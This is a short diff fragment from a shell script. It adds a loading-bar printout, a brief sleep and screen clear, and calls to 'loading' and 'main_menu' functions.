+printf "\n▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ Loading ...\n"
+sleep 0.1
+clear
+}
+loading
+main_menu
